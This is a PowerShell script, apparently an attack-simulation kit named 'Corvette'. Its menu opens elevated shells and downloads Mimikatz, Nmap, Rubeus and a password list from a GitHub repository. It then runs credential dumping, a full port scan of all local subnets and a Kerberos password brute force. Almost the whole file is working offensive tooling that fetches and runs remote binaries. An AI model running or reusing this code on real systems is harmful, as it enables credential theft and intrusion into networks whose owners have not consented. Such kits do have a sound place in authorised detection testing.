
function IsFile ([string]$path) {
    return [IO.File]::Exists($path)
}

function IsDirectory ([string]$path) {
    return (Test-Path $path) -And ((Get-Item $path) -is [IO.DirectoryInfo])
}

function BuildFullPath ([string]$parent, [string]$child) {
    return [IO.Path]::GetFullPath((Join-Path $parent $child))
}

function ReadAllBytes ([IO.BinaryReader] $reader) {
    $mem = New-Object IO.MemoryStream
    $buf = New-Object byte[] 4096
    $actual = 0
    do {
        $actual = $reader.Read($buf, 0, $buf.Length)
        If ($actual -gt 0) {
            $mem.Write($buf, 0, $actual)
        }
    } While ($actual -ne 0)

    $mem.Close()
    return $mem.ToArray()
}

function DownloadString ([string]$url) {
    $cli = New-Object Net.WebClient
    return $cli.DownloadString($url)
}

function DownloadBytes ([string]$url) {
    $resp = New-Object IO.BinaryReader([Net.HttpWebRequest]::Create($url).GetResponse().GetResponseStream())
    return ReadAllBytes($resp)
}

function DownloadFile ([string]$url, [string]$save_as) {
    $cli = New-Object Net.WebClient
    if ([string]::IsNullOrEmpty($save_as)) {
        $uri = New-Object System.Uri($url)
        $save_as = Split-Path $uri.AbsolutePath -Leaf
    } elseif ((IsDirectory $save_as)) {
        $uri = New-Object System.Uri($url)
        $filename = Split-Path $uri.AbsolutePath -Leaf
        $save_as = [IO.Path]::GetFullPath((Join-Path $save_as $filename))
    }
    $cli.DownloadFile($url, $save_as)
    return $save_as
}

function DownloadAndExtractArchive ([string]$url, [string]$directory) {
    $file = DownloadFile $url, ([IO.Path]::GetTempPath())
    Expand-Archive -Force $file $directory
    Remove-Item $file
}

class Mimikatz {
    [string]$mimikatz_dir
    [string]$mimikatz_exe

    Mimikatz() {
        $this.mimikatz_dir = BuildFullPath ([IO.Path]::GetTempPath()) ".\mimikatz"
        $this.mimikatz_exe = BuildFullPath $this.mimikatz_dir "mimikatz.exe"
        $this.Prepare()
    }

    hidden [void] Prepare() {
        if (!(IsFile $this.mimikatz_exe)) {
            $url = "https://github.com/spearmin10/corvette/blob/main/bin/mimikatz.zip?raw=true"
            $file = DownloadFile $url ([IO.Path]::GetTempPath())
            Expand-Archive -Force $file $this.mimikatz_dir
            Remove-Item $file
        }
    }

    [void]Run() {
        Start-Process -FilePath $this.mimikatz_exe
    }
}

class PortScan {
    [string]$nmap_dir
    [string]$nmap_exe

    PortScan() {
        $this.nmap_dir = BuildFullPath ([IO.Path]::GetTempPath()) ".\nmap"
        $this.nmap_exe = BuildFullPath $this.nmap_dir "nmap.exe"
        $this.Prepare()
    }

    hidden [void] Prepare() {
        if (!(IsFile $this.nmap_exe)) {
            $url = "https://github.com/spearmin10/corvette/blob/main/bin/nmap-7.92.zip?raw=true"
            $file = DownloadFile $url ([IO.Path]::GetTempPath())
            Expand-Archive -Force $file $this.nmap_dir
            Remove-Item $file
        }
    }

    [void]Run() {
        $subnet_list = Get-NetIPAddress -AddressFamily IPV4 `
                     | select IPAddress, PrefixLength `
                     | % { $_.IPAddress + '/' + $_.PrefixLength }
        foreach ($subnet in $subnet_list) {
            if (!$subnet.StartsWith("127.")) {
                Write-Host "Starting a port scan: $subnet"

                $args = @("-p", "1-65535", $subnet)
                Start-Process -FilePath $this.nmap_exe -ArgumentList $args
            }
        }
    }
}

class KerberosBruteForce {
    [string]$rubeus_dir
    [string]$rubeus_exe
    [string]$passwords_file

    KerberosBruteForce() {
        $this.rubeus_dir = BuildFullPath ([IO.Path]::GetTempPath()) ".\rubeus"
        $this.rubeus_exe = BuildFullPath $this.rubeus_dir "rubeus.exe"
        $this.passwords_file = BuildFullPath $this.rubeus_dir "passwords.txt"
        $this.Prepare()
    }

    hidden [void] Prepare() {
        if (!(IsFile $this.rubeus_exe)) {
            $url = "https://github.com/spearmin10/corvette/blob/main/bin/rubeus.zip?raw=true"
            DownloadAndExtractArchive $url $this.rubeus_dir
        }
        if (!(IsFile $this.passwords_file)) {
            $url = "https://github.com/spearmin10/corvette/blob/main/bin/passwords.zip?raw=true"
            DownloadAndExtractArchive $url $this.rubeus_dir
        }
    }

    [void]Run() {
        $args = @("brute", "/passwords:$($this.passwords_file)", "/noticket")
        Start-Process -FilePath $this.rubeus_exe -ArgumentList $args
    }
}

class Menu {
    hidden [bool]LaunchCommand($cmd) {
        switch ($cmd) {
            "1" {
                Start-Process -FilePath cmd.exe
            }
            "2" {
                Start-Process -FilePath powershell.exe
            }
            "3" {
                Start-Process -FilePath cmd.exe -verb runas
            }
            "4" {
                Start-Process -FilePath powershell.exe -verb runas
            }
            "5" {
                (New-Object Mimikatz).Run()
            }
            "6" {
                (New-Object PortScan).Run()
            }
            "7" {
                (New-Object KerberosBruteForce).Run()
            }
            default {
                return $false
            }
        }
        return $true
    }

    [void]OpenMenu() {
        Write-Host "Corvette"
        while ($true) {
            Write-Host "************************************"
            Write-Host " 1) Create a new command shell"
            Write-Host " 2) Create a new powershell"
            Write-Host " 3) Create a new command shell (Run as administrator)"
            Write-Host " 4) Create a new powershell (Run as administrator)"
            Write-Host " 5) Run mimikatz"
            Write-Host " 6) Run port scan"
            Write-Host " 7) Kerberos Brute Force"

            $cmd = $null
            do {
                $cmd = Read-Host "Please choose a menu item to run"
            } while (!$this.LaunchCommand($cmd))
        }
    }
}

(New-Object Menu).OpenMenu()
